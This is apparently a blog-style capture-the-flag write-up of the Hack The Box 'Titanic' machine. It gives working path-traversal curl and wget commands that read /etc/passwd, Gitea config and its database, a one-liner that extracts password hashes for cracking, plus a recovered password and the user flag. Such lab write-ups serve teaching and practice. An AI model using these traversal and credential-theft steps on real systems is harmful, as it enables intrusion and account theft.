---
title: Titanic
published: 2025-04-08
description: "CTF Titanic"
image: "../../assets/images/CTF/Titanic/Titanic.webp"
tags: ["window machine"]
category: CTF Hack The Box
draft: false
---


# Titanic

## Ping

Firstly i ping the machine to check whether i can communicate with the target machine.

![alt text](<../../assets/images/CTF/Titanic/image 1.png>)

## Nmap

Now i will do a simple nmap scan.

![alt text](<../../assets/images/CTF/Titanic/image 2.png>)

The nmap scan showed me that there are two ports open.

The ports are port 22 ssh and port 80 http.

looking at the nmap scan i can figure out that there is a website in the ip address.

## Website Analysis

![alt text](<../../assets/images/CTF/Titanic/image 3.png>)

browsing the ip address i was not able to connect to the site 

I manually configured the system to resolve the IP address to a domain name by editing the /etc/hosts file. Normally, when a website is accessed, the computer queries a DNS server, which responds with the corresponding IP address. The computer then establishes a connection to load the website.

If the website fails to load, it likely means that the domain does not have a public DNS record, preventing the system from resolving the domain name to its corresponding IP address. By modifying the /etc/hosts file, I bypass the need for a public DNS resolution, allowing my system to directly map the domain name to the specified IP address.

```jsx
**sudo nano /etc/hosts** 
```

![alt text](<../../assets/images/CTF/Titanic/image 4.png>)

Thus i was able to access to the website    

![alt text](<../../assets/images/CTF/Titanic/image 5.png>)

### Technology used

Now i will see what are the technology used in making the website so that i can find vulnerability in the outdated versions.

```jsx
whatweb [http://10.10.11.55](http://10.10.11.55/)
```

![alt text](<../../assets/images/CTF/Titanic/image 6.png>)

This are the technology used in this website. The server is running on **Apache 2.4.52 on Ubuntu**.The web application used are Werkzeug 3.0.3 (Python WSGI Server), Python 3.10.12, Bootstrap 4.5.2 (Frontend Framework), jQuery (JavaScript Library)

Moving back to the website i thought of trying to book a trip from Titanic 

![alt text](<../../assets/images/CTF/Titanic/image 7.png>)

After booking the trip it automatically download a json file.

![alt text](<../../assets/images/CTF/Titanic/image 8.png>)

The json file only shows the data the i filled.

![alt text](<../../assets/images/CTF/Titanic/image 9.png>)

Since this website doesn’t give me any information that i want, so i thought of finding some hidden directories in the website.

## Brute-forcing hidden directories

Now i will use ffuf to brute force the hidden directories inside the Titanic booking trip website.

```jsx
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u [http://titanic.htb/](http://titanic.htb/) -H  "Host:FUZZ.titanic.htb" -fc 301
```

![alt text](<../../assets/images/CTF/Titanic/image 10.png>)

I have found a hidden directory in the website. its called dev.

src/assets/images/CTF/Titanic/image 11.png

It says not found. so i will again edit the etc/hosts file.

![alt text](<../../assets/images/CTF/Titanic/image 11.png>)

It open a Gitea website.

Gitea is a **lightweight, self-hosted Git service** that lets us manage our repositories, issues, and code collaboration like GitHub or GitLab. It's open-source and can be installed on our own server, giving us a full control over our projects.

Exploring the developer’s repositories:

![alt text](<../../assets/images/CTF/Titanic/image 12.png>)

Since i have the access to the developer’s source code there will be a high chances of a vulnerability. so i asked AI if there is any vulnerability in here.

![alt text](<../../assets/images/CTF/Titanic/image 13.png>)

So the AI told me that if I have access to this Flask app, I could:

1. **Use Directory Traversal** to read sensitive files.
2. **Bruteforce Download Tickets** and extract personal details.
3. **Inject XSS** to steal admin/user session cookies.
4. **Modify or Delete Files** (if there's a file deletion route).

The AI showed me that I can do a path traversal in the /download route of the Flask application.

```jsx
curl "[http://titanic.htb/download?ticket=../../../../etc/passwd](http://titanic.htb/download?ticket=../../../../etc/passwd)"
```

![alt text](<../../assets/images/CTF/Titanic/image 14.png>)

Now I have successfully exploited a directory traversal vulnerability in [http://titanic.htb/download](http://titanic.htb/download), allowing me to read the /etc/passwd file. Now, let’s escalate further and try to gain a shell or access more sensitive data.

![alt text](<../../assets/images/CTF/Titanic/image 15.png>)

Looking at /etc/passwd, some interesting users appear:
**developer:** Uses /bin/bash, which means it can log in. (Target user)
**laurel:**  Uses /bin/false, meaning it cannot log in.

Now that we can read arbitrary files, let’s check for **passwords** or **SSH keys**.Since it was a difficult to find the passwd and ssh keys. I tried to read the configuration files of Gitea from Gitea documentation.

[install-with-docker](https://docs.gitea.com/installation/install-with-docker)

![alt text](<../../assets/images/CTF/Titanic/image 16.png>)

The configuration file are saved at **/data/gitea/conf/app.ini** after an installation.

```jsx
curl --path-as-is http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/conf/app.ini
```

![alt text](<../../assets/images/CTF/Titanic/image 17.png>)

I have successfully retrieved Gitea’s configuration file, which contains several useful pieces of information that could aid in privilege escalation or further exploitation.

![alt text](<../../assets/images/CTF/Titanic/image 18.png>)

If I can download gitea.db, I may able to extract user credentials stored inside.Since SQLite stores passwords hashed, try cracking them with hashcat.

I was having lots of error downloading the db. So i moved to burpsuite and see the interception of the booking trip from titanic website.

![alt text](<../../assets/images/CTF/Titanic/image 19.png>)

While sending the request to the repeater i got a URL in here so i thought of searching that in browser.

![alt text](<../../assets/images/CTF/Titanic/image 20.png>)

While searching the link in the URL it downloads a file.

![alt text](<../../assets/images/CTF/Titanic/image 21.png>)

The file gave me the user.txt flag.

```jsx
89be1e8a5faf9c0273e80fc720a8acf1
```

The db is still downloading.

```notion
wget --no-check-certificate --trust-server-names -O gitea.db "[http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db](http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db)"
```

![alt text](<../../assets/images/CTF/Titanic/image 22.png>)

ok now i am finally done with downloading the db. Now I have to extract the hashes. 

```jsx
sqlite3 gitea.db.1 "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

![alt text](<../../assets/images/CTF/Titanic/image 23.png>)

Now i will crack the hashes.

![alt text](<../../assets/images/CTF/Titanic/image 24.png>)

Got the password for the developer

![alt text](<../../assets/images/CTF/Titanic/image 25.png>)

Now i will ssh login into the user developer using the password 25282528

![alt text](<../../assets/images/CTF/Titanic/image 26.png>)

Then i was successfully able to login into the ssh login using the developer’s credentials.

**User Flag:**

![alt text](<../../assets/images/CTF/Titanic/image 27.png>)

**Root flag:**

![alt text](<../../assets/images/CTF/Titanic/image 28.png>)

Thus the Titanic challenge was completed

![alt text](<../../assets/images/CTF/Titanic/image 29.png>)